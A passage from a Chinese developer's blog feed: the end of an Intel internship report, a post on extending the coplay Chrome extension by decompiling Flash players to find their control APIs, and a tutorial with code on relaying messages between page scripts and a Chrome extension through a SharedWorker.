<h3 id="风险投资">风险投资</h3><p>Intel组建了Intel Capital来管理所有的风险投资，最近Intel收购和投资动作频频，投资Yuneec无人机，德国无人机 Ascending Technologies，量子计算机，170亿美元收购Altera等等。所以我们可以发现Intel也在增强自己的资源整合优势，占领未来的热门技术壁垒。</p>
<h2 id="Intel公司目前的SWOT（优势/劣势/机遇/挑战）">Intel公司目前的SWOT（优势/劣势/机遇/挑战）</h2><p>在2015年底，manager用SWOT总结我们全组工作。这里我也尝试总结目前Intel的SWOT。</p>
<h3 id="优势">优势</h3><p>Intel是少数几家还有fab的芯片设计厂商了，其制造工艺的技术壁垒让它的产品非常具有竞争力，其商业策略也倾向于追求高利润的市场，只做利润最高的核心芯片制造，专攻新技术形成壁垒。其目前强大的资源整合能力，不论是其他厂商和消费者，能提供非常好的客户体验，占领着行业上游，是规则的制定者。并且依旧在收购和投资新技术，涉及面广阔。</p>
<h3 id="劣势">劣势</h3><p>PC市场近年一直萎缩，Intel之前最主要的利润来源增长乏力，并且在PC和DC市场上，Intel占有绝对优势，AMD乏力，导致竞争匮乏，市场缺乏了活力。过于依赖这两个市场会导致很大的问题。</p>
<p>在现在一片红海的移动领域，Intel份额很小，受到了ARM商业模式和高通、三星、苹果等厂商修改版ARM芯片的联合冲击，芯片可选种类和性能能耗没有太多竞争力，并且生态也难以建立起来，比如很多优化只针对ARM平台。移动领域中，不仅仅是卖CPU，还在售卖通信方案、媒体处理甚至指纹识别、成像优化都被集成进来，这方面Intel的产品看起来就不如其他厂商的丰满，而且由于节奏太慢（还按照自己做桌面CPU的脚步），不得不说是在被吊打。这目前是Intel难以打开的一个局面。</p>
<p>在显卡盛行的时代，虽然Intel核心显卡已经能胜任大多数人的日常需求，但现在逆势增长的游戏本领域，高端显卡的利润可能已经高于CPU，并且高端显卡目前也通过GPGPU、CUBA等技术抢占CPU的地盘。对于通过显卡等进行的加速计算，Intel显卡性能不够，软件支持也不足，没有很好的解决方案。不知道收购了Altera的Intel能否带来一些给予FPGA的新的解决方案，为特定场景高度优化的SOC可能会方便应用到无人机、可穿戴等领域。</p>
<h3 id="挑战">挑战</h3><p>最大的挑战除了商业模式，竞争对手，生态等，还有Intel能否改变自己，变得快起来，变得新奇酷炫，变得技术壁垒丰厚。不仅仅守着之前的成就，而积极利用自身资源开拓新的战线，如以前放弃内存，现在又用新技术做出内存速度的非易失性存储，这便是一个挺好的例子。</p>
<h3 id="机遇">机遇</h3><p>目前游戏本、DC的市场增长逆势，可以成为一大增长点。4G时代到来，高通霸主地位可能被撼动，Intel在移动芯片上也在不断努力，从一些大客户如苹果、小米等入手，或许能打开局面。移动操作系统不再单一，Windows和Chrome OS目前也能较好支持移动设备，这带来了x86平台在移动平台上的机遇。<br>在IOT方向，Intel的产品得到好评，并且已经投资了多家公司，智能连接万物是Intel的一个机会。Intel的新技术的发出，也将推动行业发展，并带来丰厚的收益。Intel的软件团队虽然支持客户很好，但还需要做很多Inside out的努力，提升Intel在软件行业的知名度。</p>
<h2 id="其他">其他</h2><ul>
<li>New Employee Orientation：一个两天的活动，进行Intel历史、企业文化的介绍和团建小游戏。</li>
<li>Site Update Meeting：由中国区的总经理主持，分析公司和Site的运行状态，现场QA。</li>
</ul>
<h1 id="实习环节中的问题和具体解决方案">实习环节中的问题和具体解决方案</h1><h2 id="分享Golang使用经验">分享Golang使用经验</h2><p>每周的Code Study上，小组总会预先安排一个话题和主讲人。我主讲Golang，向团队成员介绍我是怎么开始用Golang的，介绍了一个简单的Hello World程序，紧接着从Golang现在发展得怎样、Golang的特性、官方工具链与他们的目的等方便大致介绍了Golang的入门使用，最后结合我自己写的几个程序跑分，来验证为什么我最终选择Golang作为我代理服务器实现的主要语言。</p>
<p>Golang有不少优点，它是编译，静态类型语言。有垃圾回收机制、丰富的标准库、好用的工具链，并在语言层面支持并发、内嵌C支持、向前兼容。这让它效率高，方便部署，拥有类似动态语言的特性，网络库等方便web开发，方便统一开发规范，让并发程序非常好写，并且语言底层注重性能和重用，方便升级最新的语言版本。</p>
<p>非常高兴和团队分享了我是如何选择我代理服务器的主语言的历程，并获得了他们的肯定。当时我在获取他们的开发需求后，便提出了这个语言，Intel的员工非常开放，并不对语言技术提出限制，而是非常鼓励我先进行一下探索，并拿出数据说话，这让我非常佩服Intel这种重视数据和实时，积极听取大家意见的观念。</p>
<h2 id="分享行业热点：React">分享行业热点：React</h2><p>在本周的News Update上，我提供了React &amp; React Native的foil供大家学习。主要介绍了这个Facebook出的野心勃勃的前端框架，React Native 把重点放在所有开发人员关心的平台的开发效率上—开发者只需学习一种语言就能轻易为任何平台高效地编写代码。Facebook 在多个应用程序产品中使用了React Native，并将继续为 React Native 投资。</p>
<p>我接下来从Component，Virtual DOM和Unidirectional Data Flow三个重点介绍了react的核心思想，并把它和HTML5应用，Intel的Crosswalk、Phone Gap/Cordova等技术进行了比较。</p>
<p>会议中我们从浏览器开发者的角度和应用使用者的角度来分析了各个框架的优劣，并承认了React所具有的一点优势，我们也探讨了从Intel的优势：芯片角度来DOM的渲染进行优化，并产生了一些有意义的讨论。</p>
<p>会后Manager让我们有时间可以进行新技术的尝试，我后期尝试了React Native技术，来构建原生的Android应用，虽然并没有开发真实的应用，不过开发体验很顺畅，推荐在小型实验性项目中进行进一步的探索。</p>
<p>这是我第一次进行组内的News Update分享，内容都是组内成员精心挑选出的业界新闻或是技术分享，之前听到过一些Intel的新技术和黑科技宣传，或者是竞争对手的设备更新消息，mentor非常鼓励我进行这次分享，并认为我将几个Intel的工具拿出来对比很好，提醒Intel员工注意到了最新的业界动向和资讯。</p>
<h2 id="SWPC软件峰会">SWPC软件峰会</h2><p>一年一度的英特尔亚太研发中心软件峰会到来，我们一直在开发的工具由于进展不错，被Manager鼓励进行主题演讲，并可以共享给其他团队的人进行测试使用。不过这个测试使用由于项目的部署稍显复杂，便使用了虚拟机搭建环境，会后准备直接分发虚拟机镜像便可以让其他人使用了。<br>由我来封装一个搭建好环境的虚拟机，并协助mentor准备主题演讲的Foil，这里我将我新框架的思路和mentor进行了详细的讨论，在他的foil上我填写了更多的细节，并由我俩一起修改。Manager也参与到foil的制作和修改过程中，他在邮件中详细指明了自己的修改意见，和我们一起迭代修改foil。</p>
<p>会议前一天，宣传的邮件便发向了几个其他小组，下午开始的主题演讲来得人并不是很多，但我们还是精心完成了整个宣传过程，并给出两份拷贝。我们小组的十多位同时也都到场捧场，我们也借此机会详细解释了我们工具的使用和一个很好的优化故事。<br>我们也去参加了一些其他小组的主题演讲，在他们booth旁边，查看他们作品的使用情况，并与他们交流，整个活动像是一个内部的交流大会，平时垂直分割的各个team终于有机会面对面地交流相互的工作，增加了解，激发合作和创新。</p>
<p>自己的工作能参与在整个site的软件峰会中，非常高兴，整个准备过程不到一周，安排合理，最终的演讲十分顺利，我的软件演示也没有出现纰漏。企业内部增进不同team的相互交流，激发新的增长，让内部的想法让更多人知道，这对于Intel的持续创新是十分重要的。</p>
<h2 id="其他-1">其他</h2><ul>
<li>主持自己项目的Design Review和Code Review</li>
<li>性能优化，从profile数据入手，最后用数据说话</li>
<li>锻炼Root Cause Bug的能力</li>
<li>跟随mentor进行客户支持</li>
</ul>
<h1 id="自己的体会">自己的体会</h1><h2 id="技术体会">技术体会</h2><h3 id="注重数据，注重优化">注重数据，注重优化</h3><p>在和mentor、manager交流时，我曾经几次想直接说我的一个看法，他们都告诫我，不要着急下这么一个结论，需要拿出数据进行分析做出判断。在邮件中，我们都会附带有我们得出结论的数据，这样才能让其他的同事信服。数据在Intel是十分重要的，这也是一种很严谨的工程态度。某些重要的决策不是拍拍大脑就可以做出的，做出预测、实验、收集数据、分析、再验证才能做出结论。</p>
<p>Intel的工程师非常注重性能和优化，当然我们也注重需求和复杂度，如果只是一个很少使用的小脚本，不断追求高性能稍显无意义。对于程序的性能问题，我们会使用Intel或是其他的程序运行时分析工具，分析热点代码、关键路径等，再对这些20%的瓶颈代码进行有目的的优化，这样才能做到省时省力、事半功倍。</p>
<h3 id="分解步骤，动态规划">分解步骤，动态规划</h3><p>经常我们在讨论项目接下来的安排时，总是感觉一团乱麻，而这时候manager会在白板前，大致画出我们的计划，然后按照难易程度、优先级，划分成为几个小的子任务，有的任务非常关键，有的可以并行，有点也许可有可无只是锦上添花。然后我们相互谈到，划分阶段和每个人的具体任务分配，这样一套简单的流程下来，任务、时间节点、负责人都十分清楚，随后我们更新网上的SharePoint并互发邮件进行确认，这样安排就很有效率地完成了。</p>
<p>项目进行中，如果需要改动计划也比较简单。毕竟分阶段，如果完成到后面的阶段时，就已经是超出预期了，这样整个任务的风险管理很好，不会失控，通常还能超出预期，达到很好的效果和激励作用。</p>
<h2 id="管理体会">管理体会</h2><h3 id="主持一个有效的代码审查会议">主持一个有效的代码审查会议</h3><p>我在给manager邮件说明我已经完成原型，可以进行一次代码审查了，但manager指出如果我们想进行一次优质的代码审查的话，还需要预先准备一下，因为我现在在做的工作已经不是一个单人的小项目了，而需要组内更加紧密地交流。需要先更新我项目的Wiki，并且等待反馈，因为组内同学需要一定的时间来部署、上手和验证我的原型，而此时我可以继续我后续的设计。</p>
<p>我还需要描述我设计中的概念和想法，这样我们才能进行代码审查的会议；在我们团队的公共的Wiki页面上创建一个我的项目主页，这样才能方便大家在会议前都尝试一下，提出更加具有针对性的意见。</p>
<p>从Manger的回信来看，我还需要在怎样表述我的思路，文档化我的设计上多下工夫，因为这并不是我一人的项目，在我完成初期的探索后，将我的设计很好的转化为team共有的knowledge也是非常重要的，通过design review，code study和wiki等进行一系列活动。</p>
<h3 id="代码规范和在线代码审查">代码规范和在线代码审查</h3><p>在之前的项目中，我对代码规范没有过多要求自己，虽然会进行重构，只是为了自己更容易理解，或是为了代码复用，对代码的美观、注释和其他行为规范都很缺乏，导致代码易读性很差，很难直接与其他人分享、开源，后来进行以库或组件、框架的形式发布，虽然美其名曰“封装好，提供接口”，但的确没法掩盖这个规范差的事实。</p>
<p>在这次实习中，我们的代码均使用Git管理，并结合内部的gerrit代码审查工具进行在线的评审。我之前在项目中曾经尝试和同学一起使用GitHub共同开发，但最终效果不好。于是我便抓住此次机会规范自己的代码和评审流程，享受和同事一同开发带来的乐趣。</p>
<p>第一次代码提交后，我在终端拿到一个在线Code Review网址，便急急忙忙邀请manager和mentor进行在线评审，评论可以在代码上直接看到，非常直观。总体上我代码注释不够，并且有些冗余的空格和tab建，导致在线查看难看。后来了解到需要去除这些冗余的代码空格，并使用4空格替换tab。我不是一个很喜欢折腾这些细节的人，便想找一个工具来帮助我在提交代码前自动进行代码的格式化，去除上述的瑕疵，这样符合要求，又省时省力。</p>
<p>很快我就找到了一些工具，并写了一个bash脚本来自动化这一流程，manager对此表示欣赏。</p>
<p>我代码的注释不够，我也在后续的提交中补了注释，但还是缺少一个统一的规范，虽然便于阅读的时候理解，但很难从代码注释中提炼开发文档出来，这个是我以后再开发大型项目时候需要注意的。</p>
<p>代码审查流程，我们push到一个review分支后，网上由对应的网页能查看，添加reviewer，随后可以在线批注，然后我不断提交patch修改，满意后reviewer LGTM（Looks good to me）然后才能merge。</p>
<h3 id="个人评定">个人评定</h3><p>年终需要进行每个人的评定，由个人撰写自评并自评等级，再和manager一对一进行sync，最后由manager进行提交。Intel的待遇和个人的等级和每年评定挂钩，新人如果评为超出预期的话，个人等级和待遇都将得到巨大的提升，而老员工则更多注重等级的提升和年终奖、股票所带来的附加收益。评定可以和manager开诚布公地讨论，追求实事求是，我也看到有些非常努力和出色的员工最终获得了待遇和评定的多重奖赏。</p>
<h2 id="其他体会">其他体会</h2><h3 id="团队交流与建设">团队交流与建设</h3><p>团队的组内交流机会不少，每周两次例会，敏捷会议追踪热点事情，状态汇报每周的进度、安排和问题。每周通常还有一次Code Study，按照预先指定的顺序，小组成员分别挑选和自己工作最相关的技术问题准备一个小时的交流会。比如我就和组内成员分享了我为什么要在我的项目中使用Golang和Golang的入门。会后还有评分机制，每年好评多的同事还能获得manager准备的小礼物。</p>
<p>正式员工还会有家属见面会，并且整个site还会主持公益项目，可跟随团队一起去献爱心。吃饭聚会喝喝咖啡也是少不了的，同事获得奖励，有同事要离开我们都会好好聚一下，席上大家交流气氛热烈，并会进行一些保龄球、台球等娱乐活动，增进团队感情。</p>
<p>每两个月的大组聚会，大组的所有成员会聚集在饭店或是大厅中，便享受饮品，便听各个组的状态汇报，听新员工介绍自己，并为本季度表现好的员工加油鼓劲。</p>
<h3 id="给予实习生的氛围与态度">给予实习生的氛围与态度</h3><p>Intel给予实习生非常轻松的工作环境，不加班，周末也少有同事来公司加班，没有特别大的压力，大概是轻松的环境下人才更具有创造力。Intel笔记本处理器目前在走低功耗的路线，默认频率较低，小于2Ghz，不过其睿频功能允许处理器自动升频到3Ghz以上，只要其散热等参数允许，睿频功能其实也像是Intel的这种时间安排策略，激发员工的积极性，如果有责任在身并且条件允许，员工是乐于自我奉献的。</p>
<p>在实习内容的日程安排上，并没有出现“这件事的截止日期在某日，必须做到”这样的硬指标，而是我们一起商议时间表，发现不能如期的话及时反馈调整。整个时间安排由manager把控进度，如果你提前完成了计划，那很好，便可以商议一些之前安排以外的工作。</p>
<p>Intel实习生的胸牌和正式员工没有区别，所以在公司内部是一样对待的。你可以参与公司的各种活动，在项目中与其他同事友好平等的交流。并不会因为你是实习生就会降低对你的要求，或是阻碍你去获取资源，进行项目挑战。几次讨论项目，我们都迅速地找一个会议室，对着白板一边讲解自己的看法，一边涂涂写写，项目讨论得很快，很多异议会很快消除，比线上讨论高效多了。</p>
<h2 id="MSR_(Monthly_Summary_Report)等">MSR (Monthly Summary Report)等</h2><p>每一个季度会有整个Site的Sync会议，每两个月大组会进行茶话会，而每月会进行月报。先由每个员工进行向小组内汇报，小组长总结完毕层层上报。我们可以看到自己父组织和其兄弟组织的汇总月报，这对我们了解其他组的进展，了解公司动向，谋求交流合作创新有很大帮助。</p>
<h1 id="实习反馈">实习反馈</h1><ol>
<li><p>按照实习生的能力进行分配<br>我对我整体的实习安排比较满意，但还是遗憾于没有时间深入，通常对于实习生比较安全的做法是让他们做已经很明确的周边任务（初级），做一些创新性的项目和工具（中级），不过失败的话影响不大，做一些比较明确但很重要的任务（中高级），做非常重要又极具挑战性的任务（高级）。</p>
</li>
<li><p>可以布置一些重要的任务<br>对于我来说，如果能做一个比较重要的任务，将更具有参与感，比如Facebook刚入职的员工是可以去做修改首页bug的这种任务的。对于招聘实习生的管理者来说，可以收集一些相对较为简单，但代码能投入实际使用，比如提交给upstream的这种任务，交给实习生做，应该能极大提升实习生的存在感。</p>
</li>
<li><p>可以多考虑实习生的需求<br>每个实习生都有些不同，相比于只是想着“我们要拉一个实习生进来完成某项项目“，不如看看小组和实习生共有的需求，然后有针对性的调整，以激发出实习生最大的能力。有助于实习生以后发展的项目，比如开源等，也是相当于提升实习待遇的。</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>持续半年的实习告一段落，企业实习不仅仅是我们学习技术、锻炼能力的绝佳机会，更是从另一个角度深入理解整个行业的绝佳机会，我也非常珍惜这半年的实习机会。现将一些实习报告中一些片段摘出。</p>
</blockquote>
<h1 id="企业背景以及企]]>
    </summary>
    
      <category term="intel" scheme="http://yqf3139.github.io/tags/intel/"/>
    
      <category term="internship" scheme="http://yqf3139.github.io/tags/internship/"/>
    
      <category term="flood" scheme="http://yqf3139.github.io/categories/flood/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[为coplay Chrome扩展添油加醋]]></title>
    <link href="http://yqf3139.github.io/2016/01/01/the-coplay-chrome-extension/"/>
    <id>http://yqf3139.github.io/2016/01/01/the-coplay-chrome-extension/</id>
    <published>2016-01-01T09:16:57.000Z</published>
    <updated>2016-01-23T21:57:20.050Z</updated>
    <content type="html"><![CDATA[<p>上次参加黑客马拉松之前有一个想法，就是希望能为两个人异地同看一个在线视频提供更好的体验：进度同步，弹幕，实时涂鸦等等。还有更多的实时语言功能就其实直接使用现成的微信就好。这样看来，视频进度同步和播放/暂停和拖动进度条的指令同步是核心功能。</p>
<p>当初想的通信技术方案是搭建一个私有服务器，两个浏览器通过一个<a href="https://zh.wikipedia.org/wiki/%E5%B0%8F%E4%B9%A6%E7%AD%BE" target="_blank" rel="external">Bookmarklet</a>注入脚本，Websocket通信，并由中间的私人服务器中转进行。视频控制准备强制将flash视频转为Html5播放，方便控制，不过拖着一直没去实现。</p>
<p>最近看到一个<a href="https://www.zhihu.com/question/23228162/answer/36767934" target="_blank" rel="external">推荐Chrome插件的知乎回答</a>，答主使用Chrome扩展注入脚本，使用<a href="http://peerjs.com/" target="_blank" rel="external">Peer.js</a>，底层是<a href="https://zh.wikipedia.org/zh/WebRTC" target="_blank" rel="external">WebRTC通信</a>。去中心服务器直接通信，的确方便很多，并且已经支持多个视频站，插件也已经在<a href="https://chrome.google.com/webstore/detail/coplay/heolgpojkkeacaokbpolhalhlaidpkkc/" target="_blank" rel="external">Chrome Web Store</a>上架，并<a href="https://github.com/Justineo/coplay" target="_blank" rel="external">Github开源</a>，试用后立即Star了。</p>
<p>不过应该还有很多功能可以加，查看代码后觉得可扩展性也很好，不过在那之前，我想也许应该支持更多的视频站、让视频同步的体验更好才是纯粹的。</p>
<h1 id="Flash的视频控制">Flash的视频控制</h1><p>之前固执地认为Flash视频是不可与Javascript交互的，2014年HackShanghai的时候，我们需要控制优酷视频的播放，后来由颢神找到了获取视频地址的方法，便转Html5的方式播放。不过那次由于想给用户提供一个更好的体验，很多UI都重写了，视频更加一体地融合在网页中，而这是Flash播放器做不到的。在看coplay源码的时候发现某些视频站已经发布了可以直接使用的API，如优酷的<code>PlayerPause(false);</code>，<code>info = PlayerInfo()；</code>等，可以直接方便地控制，更多的视频站由于自身需要，也加上了对javascript的API，通常我们query到DOM中的flash节点后，可以调用一个方法，比如土豆的<code>player.notify(&#39;play&#39;)</code>，更多是类似<code>player.pauseQiyiVideo()</code>这样。</p>
<p>Flash节点没有办法遍历这些在Flash中对外暴露的方法，那是怎么获得这些API的呢，可能官网上有文档，懒得去找了，跟随网页上Javascript的蛛丝马迹也许也能猜到。</p>
<h1 id="尝试添加芒果台的适配器">尝试添加芒果台的适配器</h1><p>于是我便开始猜测芒果台的API，在众多Javascript中（看到不少typo）找到了和Flash节点的调用，比如<code>c(&#39;hunantv-player-1&#39;).getActionLogInfo()</code>，不过只是一些视频信息。</p>
<p>我又开始尝试跟踪console中的播放和暂停的log，不过log是从Flash中打出的，或者是eval获得的，无法追踪源头。最终发现了一点Javascript中供Flash调用的回调函数，也没用什么用。我便觉得可能芒果台没有提供对外的API了。</p>
<p>看来硬猜是效率很低的。</p>
<h1 id="通过反编译获知Flash视频控制的API">通过反编译获知Flash视频控制的API</h1><p>回想起之前Flash被Adobe降低优先级的新闻，提到Flash是ActionScript语言编写的，并交由FlashPlayer执行，之前并没有Flash的编程经验，但感觉应该很类似Java和JVM，便搜索到了<a href="https://www.free-decompiler.com/flash/download/" target="_blank" rel="external">一个免费的SWF decompiler</a>，于是兴致勃勃地试了一下。</p>
<p><img src="/images/the-coplay-chrome-extension/ffdec.png" alt="ffdec"></p>
<p>反编译以后几乎是源码，ActionScript也基本上能读懂。查询Adobe文档后定位到<code>ExternalInterface.addCallback()</code>是注册对外的接口，而<code>ExternalInterface.call()</code>是Flash调用外部的Javascript函数，全文搜索反编译的结果很快就能定位到API了。</p>
<p>不过芒果台没有提供Seek，也就是设置视频进度的API，尝试Hack无果，最后还是放弃了。好在Bilibili和Acfun的API比较全，于是我便简单地加上了Bilibili的适配器。</p>
<p>应该来说一个好工具让我们效率倍增，尤其是Hack和性能调优的时候，比如Chrome的Javascript Profiler，Timeline和Trace就很好用，Web调优必备。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>上次参加黑客马拉松之前有一个想法，就是希望能为两个人异地同看一个在线视频提供更好的体验：进度同步，弹幕，实时涂鸦等等。还有更多的实时语言功能就其实直接使用现成的微信就好。这样看来，视频进度同步和播放/暂停和拖动进度条的指令同步是核心功能。</p>
<p>当初想的通信技术方案]]>
    </summary>
    
      <category term="chrome" scheme="http://yqf3139.github.io/tags/chrome/"/>
    
      <category term="extension" scheme="http://yqf3139.github.io/tags/extension/"/>
    
      <category term="flash" scheme="http://yqf3139.github.io/tags/flash/"/>
    
      <category term="webrtc" scheme="http://yqf3139.github.io/tags/webrtc/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何在 Chrome 插件中访问任意网页中的 JavaScript 变量？]]></title>
    <link href="http://yqf3139.github.io/2015/12/26/establish-a-duplex-communication-between-any-web-page-and-chrome-extension/"/>
    <id>http://yqf3139.github.io/2015/12/26/establish-a-duplex-communication-between-any-web-page-and-chrome-extension/</id>
    <published>2015-12-26T06:42:03.000Z</published>
    <updated>2016-01-23T21:57:20.050Z</updated>
    <content type="html"><![CDATA[<p>在折腾小工具的时候有产生了奇怪的需求，Chrome 插件需要监听任意网页中某个变量的变化，或是访问其中的值。但默认注入的 content.js 和原网页 Javascript 脚本并不运行在一个相同的环境中，无法相互访问。</p>
<p>搜索和自己尝试了如下的解决方法，现罗列如下。</p>
<h1 id="访问到目标变量">访问到目标变量</h1><p>这个很简单。虽然默认注入的content.js不能访问到原网页的变量，但可以访问和修改Dom，所以再注入一个脚本就好。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> elem = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    elem.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    elem.charset = <span class="string">'utf-8'</span>;</span><br><span class="line">    elem.addEventListener(<span class="string">'load'</span>, doCallback, <span class="literal">false</span>);</span><br><span class="line">    elem.src = url;</span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(elem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">url</span>(<span class="params">file</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> chrome.extension.getURL(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadScript(url(<span class="string">'inject.js'</span>));</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>在inject.js中便是和原网页一样的javascript环境了，但是问题来了，怎样才能将在此环境下的变量发送到后台插件中呢？</p>
<h1 id="建立原网页作用域与插件后台页面的双工通信">建立原网页作用域与插件后台页面的双工通信</h1><p>目标很明确，在inject.js中建立与后台background.js的双工通信，这样我们可以实时将网页中值的变化发送到插件中进行分析……</p>
<p>不过阻碍也很明显，由于chrome的安全策略，inject.js和后台插件虽然能直接连通，但受域名限制，而content.js则可以很轻易连通。所以如果打通inject.js与content.js就好了。</p>
<h2 id="外部服务器中转">外部服务器中转</h2><p>inject.js和background.js连上相同的websocket服务器中转，问题解决。不过还要多加一个外部服务器。</p>
<h2 id="inject-js直连后台插件">inject.js直连后台插件</h2><p>的确，Chrome提供了直连的方法。</p>
<p>首先在<code>manifest.json</code>中申明<code>externally_connectable</code>，需要申明域名限制。正当我兴高采烈地输入<code>*://*/*</code>全匹配后，发现出错，chrome文档如是说：</p>
<blockquote>
<p>This will expose the messaging API to any page which matches the URL patterns you specify. The URL pattern must contain at least a second-level domain - that is, hostname patterns like “<em>“, “</em>.com”, “<em>.co.uk”, and “</em>.appspot.com” are prohibited. </p>
</blockquote>
<p>没有办法做到让所有域名发起的连接都与<code>manifest.json</code>匹配，但对于认可的域名，只需要在inject.js中调用如下API，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ExtensionID = <span class="string">'nnhoaecbdmfokhcnldeiadllnjeebhcb'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make a simple request:</span></span><br><span class="line">chrome.runtime.sendMessage(ExtensionID, &#123;openUrlInEditor: url&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;&#125;);</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<h2 id="inject-js注入Dom事件">inject.js注入Dom事件</h2><p>这是网上一个比较通行的办法，可以约定一个Dom元素，再使用<code>MutationObserver</code>监控这个Dom元素即可。<br>不过修改Dom比较重量级，不是很喜欢这种做法。</p>
<h2 id="轮询localStorage等公共可访问变量">轮询localStorage等公共可访问变量</h2><p>两个脚本均可访问到localStorage，location等变量，所以一方修改一方轮询也是一种办法，不过如果变量发生了多次修改，每次的修改事件就很难及时发出。</p>
<h2 id="SharedWorker转发">SharedWorker转发</h2><p>最终试验成功了一种还比较满意的方法，可由 content.js 创建一个 SharedWorker的函数，并将其转换为 Blob ，再使用<code>URL.createObjectURL</code>创建为共享链接存入localStorage ， inject.js 读取后此链接后，两个脚本同时连上同一个 SharedWorker，由 worker 转发消息，可以很好双向通信。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// background.js</span></span><br><span class="line"><span class="comment">//----------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// 简单监听来自content.js的转发的内容</span></span><br><span class="line">chrome.extension.onMessage.addListener(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">request, sender, sendResponse</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'bg'</span>, request);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// content.js</span></span><br><span class="line"><span class="comment">//----------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// SharedWorker执行的逻辑，广播信息</span></span><br><span class="line"><span class="keyword">var</span> worker_function = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ports = []</span><br><span class="line">    onconnect = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (e.ports &amp;&amp; e.ports.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j = e.ports.length; i &lt; j; i++) &#123;</span><br><span class="line">                e.ports[i].onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">0</span>, n = ports.length; m &lt; n; m++) &#123;</span><br><span class="line">                        ports[m].postMessage(e.data);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ports.push(e.ports[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上述函数转为可访问的URL, 并存入localStorage</span></span><br><span class="line">localStorage.sharedWorkerURL = URL.createObjectURL(<span class="keyword">new</span> Blob([<span class="string">"("</span> +</span><br><span class="line">    worker_function.toString() + <span class="string">")()"</span></span><br><span class="line">], &#123;</span><br><span class="line">    type: <span class="string">'text/javascript'</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared = <span class="keyword">new</span> SharedWorker(localStorage.sharedWorkerURL);</span><br><span class="line">shared.port.start();</span><br><span class="line">shared.port.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'content'</span>, e);</span><br><span class="line">    <span class="comment">// 向background.js转发</span></span><br><span class="line">    chrome.extension.sendMessage(&#123;</span><br><span class="line">        greeting: e.data</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'content get 